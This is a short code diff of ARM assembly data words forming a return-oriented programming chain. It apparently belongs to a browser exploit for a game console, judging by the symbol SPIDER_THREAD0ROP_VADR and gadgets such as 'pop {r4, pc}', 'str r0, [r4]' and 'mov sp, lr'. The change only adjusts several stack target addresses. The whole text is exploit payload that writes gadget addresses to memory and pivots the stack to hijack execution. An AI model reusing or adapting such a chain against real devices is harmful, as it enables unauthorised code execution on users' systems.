@@ -19,17 +19,17 @@
 			.word 0xDEADC0DE
 
 		.word 0x00113a84 ; pop {r4, pc}
-			.word 0x0FFFFF0C ; r4
+			.word 0x0FFFFF24 ; r4
 
 		.word 0x002ad574 ; pop {r0, pc}
 			.word 0x002d6a34 ; r0 (pop {lr, pc})
 		.word 0x00254920 ; str r0, [r4] | pop {r4, pc}
-			.word 0x0FFFFF10 ; r4
+			.word 0x0FFFFF28 ; r4
 
 		.word 0x002ad574 ; pop {r0, pc}
 			.word SPIDER_THREAD0ROP_VADR ; r0
 		.word 0x00254920 ; str r0, [r4] | pop {r4, pc}
-			.word 0x0FFFFF14 ; r4
+			.word 0x0FFFFF2C ; r4
 
 		.word 0x002ad574 ; pop {r0, pc}
 			.word 0x002d6a30 ; r0 (mov sp, lr | pop {lr, pc})
